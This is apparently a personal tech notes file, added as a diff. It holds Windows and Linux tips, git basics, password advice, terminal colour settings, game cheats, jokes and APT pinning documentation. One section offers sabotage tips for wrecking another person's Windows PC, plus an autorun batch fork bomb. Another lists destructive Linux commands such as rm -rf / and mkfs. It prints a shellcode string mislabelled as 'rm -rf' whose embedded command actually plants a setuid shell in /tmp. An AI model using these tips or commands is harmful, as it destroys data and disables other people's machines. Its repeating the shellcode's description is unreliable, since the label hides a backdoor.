+\ \      / (_)_ __   __| | _____      _____  |  _ \ _ __(_)_   _____  |  \/  | __ _ _ __   __ _  __ _  ___ _ __ ___   ___ _ __ | |_ 
+ \ \ /\ / /| | '_ \ / _` |/ _ \ \ /\ / / __| | | | | '__| \ \ / / _ \ | |\/| |/ _` | '_ \ / _` |/ _` |/ _ \ '_ ` _ \ / _ \ '_ \| __|
+  \ V  V / | | | | | (_| | (_) \ V  V /\__ \ | |_| | |  | |\ V /  __/ | |  | | (_| | | | | (_| | (_| |  __/ | | | | |  __/ | | | |_ 
+   \_/\_/  |_|_| |_|\__,_|\___/ \_/\_/ |___/ |____/|_|  |_| \_/ \___| |_|  |_|\__,_|_| |_|\__,_|\__, |\___|_| |_| |_|\___|_| |_|\__|
+                                                                                                |___/                               
+-------------------------------------------------------------------
+Disable UEFI and Secure Boot on Windows 8/10.
+
+This was done on a DELL Inspiron 3646. It will be a similar method on other computers.
+Power down computer. Power up. Hit F2 as soon as computer boots up to get to UEFI control screen.
+Use arrows to navigate to Boot Options
+
+In options should be option for Secure Boot
+
+Set Secure Boot to Disabled
+
+Press F10 to save settings. Reboot.
+
+-------------------------------------------------------------------
+Drive Won't Mount In Linux
+
+If you need to save Windows, and transfer files from a drive to Windows, but the drive won't mount while using a LiveDVD, boot back into Windows.
+
+Go to Control Panel > Hardware > Power Options
+You're looking for a setting that says "Change What the Power Buttons do"
+
+Uncheck "Turn off Fast Startup"
+
+Reboot. Now Windows will REALLY shutdown and not hibernate!
+
+The drives should be unlocked in a LiveDVD
+
+-------------------------------------------------------------------
+Another Windows Fix for Locked Drives
+Always try the above fix first.
+
+Using a Linux Mint Live ISO, open Terminal and type:
+	sudo ntfsfix /dev/sdXY
+where XY is the partition. For example sdA2
+  ____ ___ _____ 
+ / ___|_ _|_   _|
+| |  _ | |  | |  
+| |_| || |  | |  
+ \____|___| |_|  
+-------------------------------------------------------------------
+Clone an archive with
+	git clone <web address>
+To push files to a repo
+	cd <git repo folder>
+	git status
+	git add file1 file2 file3... filen
+	git commit -a
+	git push
+
+-------------------------------------------------------------------
+Set up users on GIT
+	git config --global user.name "John Doe"
+	git config --global user.email johndoe@example.com
+ ____                                     _     
+|  _ \ __ _ ___ _____      _____  _ __ __| |___ 
+| |_) / _` / __/ __\ \ /\ / / _ \| '__/ _` / __|
+|  __/ (_| \__ \__ \\ V  V / (_) | | | (_| \__ \
+|_|   \__,_|___/___/ \_/\_/ \___/|_|  \__,_|___/
+-------------------------------------------------------------------
+To Reset a Lost Password on Ubuntu
+Boot from a live CD
+Mount the computer’s hard drive
+Open Terminal.
+If using Ubuntu Live CD, type
+	gksudo nautilus
+If using Linux Mint Live CD, type
+	gksudo nemo
+If using Linux Mint KDE Live CD, type
+	kdesudo dolphin
+Go to mounted drive, and find the /etc/ directory
+Scroll past all the directories until you find the shadow text file
+Create a backup of the shadow text file
+Edit the file
+Scroll down to the username in question and replace the encrypted password with:
+	U6aMy0wojraho
+
+-------------------------------------------------------------------
+Rules for Making Passwords
+	A strong password has at least 16 characters
+	A strong password uses uppercase letters.
+	A strong password is NOT made up of only uppercase letters.
+	A strong password uses lowercase letters.
+	A strong password is NOT made up of only lowercase letters.
+	A strong password uses numbers.
+	A strong password is NOT made up of only numbers.
+	A strong password uses symbols, such as !@#$%^&*()<>?:”{}+_
+	A strong password is NOT made up of only symbols.
+	A strong password is NOT found on only one row of the keyboard.
+	A strong password is NOT a series of similar keypresses on the keyboard.
+	A strong password is NOT like your previous password.
+	A strong password is NOT your name, and does NOT use any part of your name.
+	A strong password is NOT your login ID, and does NOT use any part of your login ID
+	A strong password is NOT your friend’s name.
+	A strong password is NOT the password your friend uses.
+	A strong password is NOT a family member’s name.
+	A strong password is NOT the password a family member uses.
+	A strong password is NOT a dictionary word.
+	A strong password is NOT your bank account number.
+	A strong password is NOT your social security number
+	A strong password is NOT your zip code, and does NOT use any part of your mailing address (either past or present)
+	A strong password is NOT your military ID number.
+	A strong password is NOT a password that unlocks a bunch of stored passwords.
+	A strong password is NEVER used as a login ID somewhere else.
+
+I highly recommend the following sites for telling if the password you are using is secure:
+www.passfault.com
+www.howsecureismypassword.net
+
+Here are some password sites I approve of:
+http://maord.com/ - I highly recommend this site for generating passwords as it can generate up to 2500 passwords at a time (viewable as a webpage, or downloadable in CSV format or plain text), and includes features like MD5 and SHA1 hash values for encryption.
+www.passwordcard.org/en - For those of you who feel the need to have your passwords in print, Password Card does just that. It prints multiple secure passwords on a wallet-sized card for you to print, laminate, and save. Each card comes with 37 very secure passwords (8 passwords, 29 characters in length horizontally and 29 passwords, 8 characters in length vertically).
+www.passwordchart.com/ - This is a unique way to make a password! Type in a passphrase, and it generates a wallet-size chart for you. Then using substitution you can then make other secure passwords from simple words and phrases. Don’t lose the card though, or password you have will be lost! Includes options to generate charts with numbers and symbols.
+
+-------------------------------------------------------------------
+  ____      _                
+ / ___|___ | | ___  _ __ ___ 
+| |   / _ \| |/ _ \| '__/ __|
+| |__| (_) | | (_) | |  \__ \
+ \____\___/|_|\___/|_|  |___/
+-------------------------------------------------------------------
+RGB to CMYK Conversion
+	computedC = 1 - (r/255)
+	computedM = 1 - (g/255)
+	computedY = 1 - (b/255)
+Find the minimum
+	C = (computedC - minCMY) / (1 - minCMY)
+	M = (computedM - minCMY) / (1 - minCMY)
+	Y = (computedY - minCMY) / (1 - minCMY)
+	K = minCMY
+	
+-------------------------------------------------------------------
+Previewing LS_COLOR changes across a spectrum
+
+for c in {0..255} ; do
+    echo -e "\e[38;05;${c}m ${c} Bash Prompt Color Chart\e[0m" 
+done
+
+You can change the first two numbers and preview all the color combinations across 255 permutations.
+
+-------------------------------------------------------------------
+Changing Directory Colors in Terminal
+When your running Linux and do a "ls -al --color" in your Bash shell,  on some systems the directory color is so dark you can barely make out the directory names? This is surprisingly a common problem. Here’s the solution:
+You can change both the intensity and the color, along with the background color on lots of things.
+
+Your color choices are:
+Effects
+	00	Default
+	01	Bold / Intense
+	04	Underlined
+	05	Flashing
+	07	Reversed
+	08	Concealed
+Colors
+	30	Black			01;30	Dark Grey		90	Dark Grey
+	31	Red			01;31	Light red		91	Light red
+	32	Green			01;32	Light green		92	Light green
+	33	Orange			01;33	Yellow			93	Yellow
+	34	Blue			01;34	Light blue		94	Light blue
+	35	Purple			01;35	Light purple		95	Light purple
+	36	Cyan			01;36	Turquoise		96	Turquoise
+	37	Grey			01;37	White			97	White
+
+Backgrounds
+	40	Black background		100	Dark grey background
+	41	Red background			101	Light red background
+	42	Green background		102	Light green background
+	43	Orange background		103	Yellow background
+	44	Blue background			104	Light blue background
+	45	Purple background		105	Light purple background
+	46	Cyan background			106	Turquoise background
+	47	Grey background
+
+THE SWEET SPOT!!! = 38;05;{1..255}
+
+The first number is how light or dark you want the color to be, followed by a semicolon, and then the actual number of the color. If you want a background color, put in another semicolon and follow it with a background color. For example, dark gray text on a red background looks like this:
+01;30;41
+After you alter your .bashrc file, to put the changes in effect you will have to restart your shell.
+
+You can have color combinations with 2, 3, 4, or more color tags. Experiment.
+There are also numbers that produce color that are not included in the standard chart (for example, 38 which I marked as a sweet spot)
+
+Here's some colors I want to save:
+Black Text on Red Background = 38;05;0;41
+White Blinking Test on Red Background = 01;05;41
+
+My preferred LS_COLORS config is:
+LS_COLORS='di=07;01;90;93:ln=35;40:so=32;40:pi=33;40:ex=31;40:bd=34;46:cd=34;43:su=0;41:sg=0;46:tw=0;42:ow=0;43:*.mp3=38;05;201:*.flac=38;05;202:*.wav=38;05;208:*.midi=38;05;208:*.ogg=38;05;202:*.jpg=38;05;39:*.png=38;05;39:*.gif=38;05;40:*.bmp=38;05;40:*.pdf=38;05;191:*.epub=38;05;191:*.doc=38;05;190:*.txt=38;05;190:*.odt=38;05;183:*.odg=38;05;183:*.torrent=00;38;05;238:';
+
+ ____                                                ____                                          _                    __        ___           _                   
+|  _ \  __ _ _ __   __ _  ___ _ __ ___  _   _ ___   / ___|___  _ __ ___  _ __ ___   __ _ _ __   __| |___    ___  _ __   \ \      / (_)_ __   __| | _____      _____ 
+| | | |/ _` | '_ \ / _` |/ _ \ '__/ _ \| | | / __| | |   / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` / __|  / _ \| '_ \   \ \ /\ / /| | '_ \ / _` |/ _ \ \ /\ / / __|
+| |_| | (_| | | | | (_| |  __/ | | (_) | |_| \__ \ | |__| (_) | | | | | | | | | | | (_| | | | | (_| \__ \ | (_) | | | |   \ V  V / | | | | | (_| | (_) \ V  V /\__ \
+|____/ \__,_|_| |_|\__, |\___|_|  \___/ \__,_|___/  \____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|___/  \___/|_| |_|    \_/\_/  |_|_| |_|\__,_|\___/ \_/\_/ |___/
+                   |___/                                                                                                                                            
+-------------------------------------------------------------------
+Create Havoc on Windows
+Just because I hate Windows, I had to include this section.
+Here are some interesting ways to send a computer to hell.
+	In the BIOS disable the processors L2 cache. Machine crawls
+	Windows+break-->advanced system settings --> hardware tab --> Device Manager, right click disable mouse (make sure you can get here with just your keyboard so you can undo this!)
+	ctrl+alt + Arrow key - on some graphics cards this rotates the screen. (usually with no method of undoing this unless you know this shortcut)
+	Make a floppy boot disc/usb Key/CD Rom, pop it in the floppy drive and ensure its set to first in the boot order in bios (bonus points for removing the hdd from boot list and creating all 3 boot discs with a different os on each so they fix one then get the next!)
+	Use a partitioning tool to shrink the hdd partition to a few mb more than is currently in use
+	Do the opposite and fill up available space with multiple copies of large files. Combined with a startup script to start the copies would keep the hard drive filled if they first attempted cleanup by deleting files.
+And a few irritations to garnish the pc with
+	If it had internet access - Open Internet Properties --> connections Tab -->Lan Settings, Check use a proxy server, set the address to 127.0.0.1 (prevents them googling for solutions :P)
+	Right click on desktop - View - uncheck show desktop icons (irritating but not tough to fix)
+	sticky tape on the bottom of the mouse can disrupt the laser stopping the mouse working (couple this with the major disabling of the mouse in device manager to add confusion).
+	In word Office button -->Word Options --> proofing --> AutoCorrect Options --> add a few entries for common words, subtlety is your friend, is --> was the --> teh etc (2k7 instructions but can be done via different route in most versions)
+
+-------------------------------------------------------------------
+Windows Fork Bomb
+Create a .bat file containing the following text and make it autorun by dropping the .bat in startup folder
+
+:s
+start %0
+goto s
+
+This will spawn huge numbers of processes untill the machine grinds to a halt.
+
+-------------------------------------------------------------------
+Screw Windows with One Careless Click
+Locate a shortcut to a text file on your desktop. Right click on the shortcut and select Open With. Select Notepad as the application. Do not pay any attention to the check box that says “Always use this type of file” that is checked off by default. This is important. Do not touch the checkbox.	Observe that all of your application files now have .lnk tacked onto the end of the name and no matter what application you try to run it just pops up Notepad and displays the binary content of the lnk file. What a mess! You can’t run anything.
+
+Solution
+If you actually did this. Then you really need to clean this up. This is going to take some research. Find out where the file associations are stored in the registry.  Find the entry for .lnk files. Remove the notepad association.
+
+ ____                                                ____                                          _                     _     _                  
+|  _ \  __ _ _ __   __ _  ___ _ __ ___  _   _ ___   / ___|___  _ __ ___  _ __ ___   __ _ _ __   __| |___    ___  _ __   | |   (_)_ __  _   ___  __
+| | | |/ _` | '_ \ / _` |/ _ \ '__/ _ \| | | / __| | |   / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` / __|  / _ \| '_ \  | |   | | '_ \| | | \ \/ /
+| |_| | (_| | | | | (_| |  __/ | | (_) | |_| \__ \ | |__| (_) | | | | | | | | | | | (_| | | | | (_| \__ \ | (_) | | | | | |___| | | | | |_| |>  < 
+|____/ \__,_|_| |_|\__, |\___|_|  \___/ \__,_|___/  \____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|___/  \___/|_| |_| |_____|_|_| |_|\__,_/_/\_\
+                   |___/                                                                                                                          
+-------------------------------------------------------------------
+“rm -rf /” Deletes Everything
+The command “rm -rf /” deletes everything it possibly can, including all data on the hard drive, and all data on connected removable media devices.
+
+-------------------------------------------------------------------
+Disguised rm -rf /
+char esp[] __attribute__ ((section(".text"))) /* e.s.p
+release */
+= "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
+"\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
+"\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
+"\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
+"\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
+"\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
+"\x6e\x2f\x73\x68\x00\x2d\x63\x00"
+"cp -p /bin/sh /tmp/.beyond; chmod 4755
+/tmp/.beyond;";
+
+This is the hex version of rm -rf. It will delete everything just like the above command.
+The Lesson: Don’t run weird looking, obviously disguised code that you don’t understand.
+
+-------------------------------------------------------------------
+“mkfs.ext4 /dev/sda1” - Formats the hard drive
+This command formats the drive and replaces your current drive (and all your files) with a new ext4 partition.
+
+-------------------------------------------------------------------
+“mv ~ /dev/null” - Moves Your Home Directory to a Black Hole
+/dev/null is a special directory. Moving something to /dev/null is the same thing as destroying it. So this command would delete your entire home directory.
+
+  ____ _                _      ____          _           
+ / ___| |__   ___  __ _| |_   / ___|___   __| | ___  ___ 
+| |   | '_ \ / _ \/ _` | __| | |   / _ \ / _` |/ _ \/ __|
+| |___| | | |  __/ (_| | |_  | |__| (_) | (_| |  __/\__ \
+ \____|_| |_|\___|\__,_|\__|  \____\___/ \__,_|\___||___/
+-------------------------------------------------------------------
+Princess Maker 2
+Go to town. Hold F12-R-N-Q. Go back home. Go to town.
+
+-------------------------------------------------------------------
+ZAngband
+You can access Debugging mode, without that unsightly WIZARD mark on the screen, by enabling cheats in the menu. Press = then "i", and select f. This will allow you to cheat death, and enables all Debugging commands.
+
+=== Debugging mode ===
+Debugging mode is a bit more useful. To enter debug mode for the first time, hold down the ctrl key and press 'a', and respond yes to the warning and question the game provides you with. Any command you type immediately after holding down the ctrl key and press 'a' will be processed as a debug command. 
+To enter a command count: type '0', enter the number desired, and press enter. When prompted for a command, hold down the ctrl key and type 'a', then immediately enter a debug command.
+
+=== Wizard mode ===
+Wizard mode does nothing else except keep your character alive, provide verbose information on all damage you do to monsters, and explain why an object disappears. To enter wizard mode, hold down the ctrl key and press 'w'.
+
+-------------------------------------------------------------------
+Flare RPG Cheats
+Save files are in
+        ~/.local/share/flare
+Game modules are found in
+        /usr/share/games/flare/flare-game/mods
+
+-------------------------------------------------------------------
+Crawl Tiles Cheats (may not be current)
+Press & in game to access Wizard Mode
+Press ? to see possible cheats
+
+  ___              _        _     _         ___              _            
+ / _ \ _   _  ___ | |_ __ _| |__ | | ___   / _ \ _   _  ___ | |_ ___  ___ 
+| | | | | | |/ _ \| __/ _` | '_ \| |/ _ \ | | | | | | |/ _ \| __/ _ \/ __|
+| |_| | |_| | (_) | || (_| | |_) | |  __/ | |_| | |_| | (_) | ||  __/\__ \
+ \__\_\\__,_|\___/ \__\__,_|_.__/|_|\___|  \__\_\\__,_|\___/ \__\___||___/
+-------------------------------------------------------------------
+Never test for an error condition you don't know how to handle.
+
+-------------------------------------------------------------------
+“Maybe books won’t survive the transition to digital devices, any more than scrolls survived the transition to movable type… what the digital age portends is not the end of the paper container of the book, but rather the way paper organized our assumptions about writing altogether.”
+
+-------------------------------------------------------------------
+My Prices
+Answers					$.50
+Long answers				$1.00
+Answers requiring thought		$2.00
+Correct answers				$5.00
+Dumb looks are still free.
+
+-------------------------------------------------------------------
+“Before you buy software, make sure it believes in the same things you do. Whether you realize it or not, software comes with a set of beliefs built in. Before you choose software, make sure it shares yours.”
+
+-------------------------------------------------------------------
+The Programmers Alphabet
+A is for APPLE who sent us our Macs,
+D is for DEC, and they sold us a Vax.
+C is the language in which we write source,
+and B is our sort, which is BROKEN, of course.
+
+E is an ERROR when code is compiled,
+F is a FORK for creating a child,
+G is the GETTY that sits on the line,
+and H is a HANGUP whic:^?{^Zo^?{bD^]NO CARRIER
+
+I is the INTERCONNECTION of kit,
+J is the JOY when the cables all fit.
+K is for KERMIT, to copy a file,
+and L are the LINES that we drop all the while.
+
+M is the MODEM we use from our home,
+N are the NIGHTS which we spend on the 'phone,
+O is the OUTPUT we get from the host,
+and P are the 'PHONE BILLS we get in the post.
+
+Q for SIGQUIT makes our process abort,
+R is the REASON sigquit should be caught.
+S is the SIGNAL we catch and ignore,
+and T is the TRAP which we miss, and dump core.
+
+U is for UNIX -- I hope that is clear,
+V is the VISUAL editor here.
+W stands for the WINDOWS we use,
+and X for the windowing system we choose.
+
+Y is for YACC, quite a specialist tool,
+Z for the snores from the programming pool.
+
+-------------------------------------------------------------------
+Job Review Catch Phrases
+
+skilled oral communicator
+		Mumbles inaudibly when attempting to speak. Talks to self. Argues with self. Loses these arguments.
+
+skilled written communicator
+		Scribbles well. Memos are invariably illegible, except the portions that attribute failure to someone else.
+
+growth potential
+		with proper guidance, periodic counseling, and remedial training, the reviewee may, given enough time and close supervision, meet the minumum requirements expected of him by the company.
+
+key company figure
+		serves as the perfect counter example.
+
+consistent
+		Reviewee hasn’t gotten anything right yet, and it is anticipated that this trend will continue.
+
+an excellent sounding board
+		Present reviewee with any number of alternatives, and implement them in the order precisely opposite of his/her specification.
+
+good planner and organizer
+		Usually manages to put on socks before shoes. Can match the animal tags on his clothing
+
+has management potential
+		Because of his intimate relationship with inanimate objects, the reviewee has been appointed to the critical position of department pencil monitor
+
+inspirational
+		A true inspiration to others. (“There, but for the grace of God, go I.”)
+
+adapts to stress
+		passes wind, water, or out, depending on the severity of the job.
+
+goal oriented
+		continually sets low goals for himself, and usually fails to meet them.
+
+-------------------------------------------------------------------
+at the i/o window they stand and look,
+to ask for the answers they could get from a book.
+complex or moronic, they don't seem to care.
+they'll keep hounding you 'til you pull out your hair.
+"go ask consulting" you say with a smile,
+though your mind is on killing the scum all the while.
+"my printer ain't working, can you tell me what's wrong?"
+so you walk back and say "it can't work, it's not on."
+--  poem found in the 1986 logsheets, anonymous writer at U. Kansas
+
+-------------------------------------------------------------------
+Do not try to guess the root password, that is impossible. Instead, realise the truth... there is no root password. Then you will see that it is 'sudo' that grants you access and not the root password.
+
+-------------------------------------------------------------------
+“I think computer viruses should count as life. I think it says something about human nature that the only form of life we have created so far is purely destructive. We’ve created life in our own image.”
+
+-------------------------------------------------------------------
+Is it possible that software is not like anything else, that it is meant to be discarded:  that the whole point is to always see it as a soap bubble?
+
+-------------------------------------------------------------------
+“A wise designer lets users do his work for him rather than attempt to figure out what they want. After designing a complex of buildings, an architect was supposed to design the walkways between the buildings. He did not assume he knew how users would really use the walkways between buildings. So he didn’t design the walkways, or even build them at the same time he built the buildings. Rather he had a field of grass planted between the buildings. It is rumored he even put up signs saying, “Please Walk On The Grass.” A few months after the buildings were completed, he came back and saw where the most worn paths were where people walked across the grass between the buildings. Then, he knew where to place the walkways.”
+
+-------------------------------------------------------------------
+“We’re sorry, but your password must contain an uppercase letter, a lowercase letter, a number, a symbol, a haiku, a gang sign, a hieroglyph, a Greek God, and the blood of a virgin.”
+
+-------------------------------------------------------------------
+10 Immutable Laws of Security
+	If a bad guy can persuade you to run his program on your computer, it's not your computer anymore.
+	If a bad guy can alter the operating system on your computer, it's not your computer anymore.
+	If a bad guy has unrestricted physical access to your computer, it's not your computer anymore.
+	If you allow a bad guy to upload programs to your website, it’s not your website anymore.
+	Weak passwords trump strong security.
+	A computer is only as secure as the administrator is trustworthy.
+	Encrypted data is only as secure as the decryption key
+	An out-of-date virus scanner is only marginally better than no virus scanner at all.
+	Absolute anonymity isn’t practical, either in real life or on the Web.
+	Technology is not a panacea.
+
+-------------------------------------------------------------------
+10 Immutable Laws of Security Administration
+	Nobody believes anything bad can happen to them, until it does.
+	Security only works if the secure way also happens to be the easy way.
+	If you don’t keep up with security fixes, your network won’t be yours for very long.
+	It doesn’t do much to install security fixes on your computer that was never secured to be begin with.
+	Eternal vigilance is the price of security.
+	There really is someone out there trying to guess your passwords.
+	The most secure network is a well-administered one.
+	The difficulty of defending a network is directly proportional to it’s complexity.
+	Security isn’t about risk avoidance; it’s about risk management.
+	Technology is not a panacea.
+	
+-------------------------------------------------------------------
+10 Commandments of Logic
+	Thou shall not attack a person’s character, but the argument. (ad hominem)
+	Thou shalt not misrepresent or exaggerate a person’s argument in order to make them easier to attack. (Straw man fallacy)
+	Thou shalt not use small numbers to represent the whole. (Hasty generalization)
+	Thou shalt not argue thy position by assuming one of the premises is true. (Begging the question)
+	Thou shalt not claim that because something occurred before, it must be the cause. (Post Hoc/False Cause)
+	Thou shalt not reduce the argument down to two possibilities. (False dichotomy)
+	Thou shalt not argue that because of our ignorance, claim must be true or false. (Ad ignorantum)
+	Thou shalt not lay the burden of proof onto him that is questioning the claim. (Burden of proof reversal)
+	Thou shalt not assume “this” follows “that” when it has no logical connection. (Non sequitur)
+	Thou shalt not claim that because a premise is popular, it must be true. (Bandwagon fallacy)
+
+    _    ____ _____   ____            __                                   
+   / \  |  _ \_   _| |  _ \ _ __ ___ / _| ___ _ __ ___ _ __   ___ ___  ___ 
+  / _ \ | |_) || |   | |_) | '__/ _ \ |_ / _ \ '__/ _ \ '_ \ / __/ _ \/ __|
+ / ___ \|  __/ | |   |  __/| | |  __/  _|  __/ | |  __/ | | | (_|  __/\__ \
+/_/   \_\_|    |_|   |_|   |_|  \___|_|  \___|_|  \___|_| |_|\___\___||___/
+-------------------------------------------------------------------
+How to use APT Preferences
+The APT preferences file /etc/apt/preferences and the fragment files in the /etc/apt/preferences.d/ folder can be used to control which versions of packages will be selected for installation.
+Several versions of a package may be available for installation when the sources.list(5) file contains references to more than one distribution (for example, stable and testing). APT assigns a priority to each version that is available. Subject to dependency constraints, apt-get selects the version with the highest priority for installation. The APT preferences override the priorities that APT assigns to package versions by default, thus giving the user control over which one is selected for installation.
+Several instances of the same version of a package may be available when the sources.list(5) file contains references to more than one source. In this case apt-get downloads the instance listed earliest in the sources.list(5) file. The APT preferences do not affect the choice of instance, only the choice of version.
+
+Preferences are a strong power in the hands of a system administrator but they can become also their biggest nightmare if used without care! APT will not question the preferences, so wrong settings can lead to uninstallable packages or wrong decisions while upgrading packages. Even more problems will arise if multiple distribution releases are mixed without a good understanding of the following paragraphs. Packages included in a specific release aren't tested in (and therefore don't always work as expected in) older or newer releases, or together with other packages from different releases. You have been warned.
+
+Note that the files in the /etc/apt/preferences.d directory are parsed in alphanumeric ascending order and need to obey the following naming convention: The files have either no or "pref" as filename extension and only contain alphanumeric, hyphen (-), underscore (_) and period (.) characters. Otherwise APT will print a notice that it has ignored a file, unless that file matches a pattern in the Dir::Ignore-Files-Silently configuration list - in which case it will be silently ignored.
+
+APT's Default Priority Assignments
+If there is no preferences file or if there is no entry in the file that applies to a particular version then the priority assigned to that version is the priority of the distribution to which that version belongs. It is possible to single out a distribution, "the target release", which receives a higher priority than other distributions do by default. The target release can be set on the apt-get command line or in the APT configuration file /etc/apt/apt.conf. Note that this has precedence over any general priority you set in the /etc/apt/preferences file described later, but not over specifically pinned packages. For example,
+
+           apt-get install -t testing some-package
+
+APT::Default-Release "stable";
+If the target release has been specified then APT uses the following algorithm to set the priorities of the versions of a package. Assign:
+
+priority 1 = to the versions coming from archives which in their Release files are marked as "NotAutomatic: yes" but not as "ButAutomaticUpgrades: yes" like the Debian experimental archive.
+priority 100 = to the version that is already installed (if any) and to the versions coming from archives which in their Release files are marked as "NotAutomatic: yes" and "ButAutomaticUpgrades: yes" like the Debian backports archive since squeeze-backports.
+priority 500 = to the versions that are not installed and do not belong to the target release.
+priority 990 = to the versions that are not installed and belong to the target release.
+
+If the target release has not been specified then APT simply assigns priority 100 to all installed package versions and priority 500 to all uninstalled package versions, except versions coming from archives which in their Release files are marked as "NotAutomatic: yes" - these versions get the priority 1 or priority 100 if it is additionally marked as "ButAutomaticUpgrades: yes".
+
+APT then applies the following rules, listed in order of precedence, to determine which version of a package to install.
+
+        Never downgrade unless the priority of an available version exceeds 1000. ("Downgrading" is installing a less recent version of a package in place of a more recent version. Note that none of APT's default priorities exceeds 1000; such high priorities can only be set in the preferences file. Note also that downgrading a package can be risky.)
+	Install the highest priority version.
+	If two or more versions have the same priority, install the most recent one (that is, the one with the higher version number).
+	If two or more versions have the same priority and version number but either the packages differ in some of their metadata or the --reinstall option is given, install the uninstalled one.
+	In a typical situation, the installed version of a package (priority 100) is not as recent as one of the versions available from the sources listed in the sources.list(5) file (priority 500 or 990). Then the package will be upgraded when apt-get install some-package or apt-get upgrade is executed.
+	More rarely, the installed version of a package is more recent than any of the other available versions. The package will not be downgraded when apt-get install some-package or apt-get upgrade is executed.
+	Sometimes the installed version of a package is more recent than the version belonging to the target release, but not as recent as a version belonging to some other distribution. Such a package will indeed be upgraded when apt-get install some-package or apt-get upgrade is executed, because at least one of the available versions has a higher priority than the installed version.
+
+The Effect of APT Preferences
+The APT preferences file allows the system administrator to control the assignment of priorities. The file consists of one or more multi-line records separated by blank lines. Records can have one of two forms, a specific form and a general form.
+
+The specific form assigns a priority (a "Pin-Priority") to one or more specified packages with a specified version or version range. For example, the following record assigns a high priority to all versions of the perl package whose version number begins with "5.10". Multiple packages can be separated by spaces.
+
+	Package: perl
+	Pin: version 5.10*
+	Pin-Priority: 1001
+
+The general form assigns a priority to all of the package versions in a given distribution (that is, to all the versions of packages that are listed in a certain Release file) or to all of the package versions coming from a particular Internet site, as identified by the site's fully qualified domain name. This general-form entry in the APT preferences file applies only to groups of packages. For example, the following record assigns a high priority to all package versions available from the local site.
+
+	Package: *
+	Pin: origin ""
+	Pin-Priority: 999
+
+A note of caution: the keyword used here is "origin" which can be used to match a hostname. The following record will assign a high priority to all versions available from the server identified by the hostname "ftp.de.debian.org"
+	
+	Package: *
+	Pin: origin "ftp.de.debian.org"
+	Pin-Priority: 999
+
+This should not be confused with the Origin of a distribution as specified in a Release file. What follows the "Origin:" tag in a Release file is not an Internet address but an author or vendor name, such as "Debian" or "Ximian".
+
+The following record assigns a low priority to all package versions belonging to any distribution whose Archive name is "unstable".
+
+	Package: *
+	Pin: release a=unstable
+	Pin-Priority: 50
+
+The following record assigns a high priority to all package versions belonging to any distribution whose Codename is "jessie".
+
+	Package: *
+	Pin: release n=jessie
+	Pin-Priority: 900
+
+The following record assigns a high priority to all package versions belonging to any release whose Archive name is "stable" and whose release Version number is "7.0".
+
+	Package: *
+	Pin: release a=stable, v=7.0
+	Pin-Priority: 500
+
+Regular expressions and glob(7) syntax
+APT also supports pinning by glob(7) expressions, and regular expressions surrounded by slashes. For example, the following example assigns the priority 500 to all packages from experimental where the name starts with gnome (as a glob(7)-like expression) or contains the word kde (as a POSIX extended regular expression surrounded by slashes).
+
+	Package: gnome* /kde/
+	Pin: release n=experimental
+	Pin-Priority: 500
+
+The rule for those expressions is that they can occur anywhere where a string can occur. Thus, the following pin assigns the priority 990 to all packages from a release starting with precise.
+
+	Package: *
+	Pin: release n=precise*
+	Pin-Priority: 990
+
+If a regular expression occurs in a Package field, the behavior is the same as if this regular expression were replaced with a list of all package names it matches. It is undecided whether this will change in the future; thus you should always list wild-card pins first, so later specific pins override it. The pattern "*" in a Package field is not considered a glob(7) expression in itself.
+
+How APT Interprets Priorities
+Priorities (P) assigned in the APT preferences file must be positive or negative integers. They are interpreted as follows (roughly speaking):
+
+	P >= 1000
+	causes a version to be installed even if this constitutes a downgrade of the package
+
+	990 <= P < 1000
+	causes a version to be installed even if it does not come from the target release, unless the installed version is more recent
+
+	500 <= P < 990
+	causes a version to be installed unless there is a version available belonging to the target release or the installed version is more recent
+
+	100 <= P < 500
+	causes a version to be installed unless there is a version available belonging to some other distribution or the installed version is more recent
+
+	0 < P < 100
+	causes a version to be installed only if there is no installed version of the package
+
+	P < 0
+	prevents the version from being installed
+
+If any specific-form records match an available package version then the first such record determines the priority of the package version. Failing that, if any general-form records match an available package version then the first such record determines the priority of the package version.
+
+For example, suppose the APT preferences file contains the three records presented earlier:
+
+	Package: perl
+	Pin: version 5.10*
+	Pin-Priority: 1001
+
+	Package: *
+	Pin: origin ""
+	Pin-Priority: 999
+	
+	Package: *
+	Pin: release unstable
+	Pin-Priority: 50
+
+Then:
+The most recent available version of the perl package will be installed, so long as that version's version number begins with "5.10". If any 5.10* version of perl is available and the installed version is 5.14*, then perl will be downgraded.
+
+A version of any package other than perl that is available from the local system has priority over other versions, even versions belonging to the target release.
+
+A version of a package whose origin is not the local system but some other site listed in sources.list(5) and which belongs to an unstable distribution is only installed if it is selected for installation and no version of the package is already installed.
+
+
+Determination of Package Version and Distribution Properties
+The locations listed in the sources.list(5) file should provide Packages and Release files to describe the packages available at that location.
+The Packages file is normally found in the directory .../dists/dist-name/component/arch: for example, .../dists/stable/main/binary-i386/Packages. It consists of a series of multi-line records, one for each package available in that directory.
+Only two lines in each record are relevant for setting APT priorities:
+
+	the Package: line
+		gives the package name
+	
+	the Version: line
+		gives the version number for the named package
+
+	The Release file is normally found in the directory .../dists/dist-name: for example, .../dists/stable/Release, or .../dists/wheezy/Release. It consists of a single multi-line record which applies to all of the packages in the directory tree below its parent. Unlike the Packages file, nearly all of the lines in a Release file are relevant for setting APT priorities:
+
+	the Archive:
+		or Suite: line names the archive to which all the packages in the directory tree belong. For example, the line "Archive: stable" or "Suite: stable" specifies that all of the packages in the directory tree below the parent of the Release file are in a stable archive. Specifying this value in the APT preferences file would require the line:
+		
+		Pin: release a=stable
+
+	the Codename: line
+		names the codename to which all the packages in the directory tree belong. For example, the line "Codename: jessie" specifies that all of the packages in the directory tree below the parent of the Release file belong to a version named jessie. Specifying this value in the APT preferences file would require the line:
+		
+		Pin: release n=jessie
+
+	the Version: line
